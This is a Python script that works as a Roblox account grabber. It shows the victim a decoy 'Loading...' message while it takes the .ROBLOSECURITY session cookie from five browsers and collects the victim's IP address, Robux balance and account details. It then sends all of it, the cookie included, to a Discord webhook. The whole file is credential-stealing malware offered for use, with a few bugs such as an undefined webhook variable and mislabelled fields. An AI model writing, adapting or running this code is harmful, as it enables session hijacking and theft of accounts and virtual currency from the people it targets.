import os
import codecs
import json
import robloxpy
import requests,re
from discordwebhook import *
import browser_cookie3
webhook = "Webhooksss"


def command(c):
    os.system(c)
def cls():
    os.system("cls")




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
discord = Discord(url=webhook)
discord.post(
    username="SHOX - BOT 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/1001900032896806976/1038399198695006238/pobrane_7.png",
    embeds=[
        {
            "username": "SHOX - BOT 🍪",
            "title": "💸 +1 Account 🕯",
            "description" : f"[Github Page](https://github.com/5-xss/) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "💬Username💭", "value": username, "inline": True},
                {"name": "💰Robux Bal💰", "value": robux, "inline": True},
                {"name": "🔑Premium🔑", "value": premium,"inline": True},
                {"name": "⚒Creation Date🛠", "value": crdate, "inline": True},
                {"name" : "📊RAP📊", "value": rap,"inline": True},
                {"name" : "👦Friends🧒", "value": friends, "inline": True},
                {"name" : "🎂Account Age🎂", "value": age, "inline": True},
                {"name" : "Discord Token", "value": rap,"inline": True},
                {"name" : "WIFI PASS", "value": rap,"inline": True},
                {"name" : "🖥IP Address💻", "value" : ip_address, "inline:": True},
                {"name" : "🍪COOKIE🍪", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
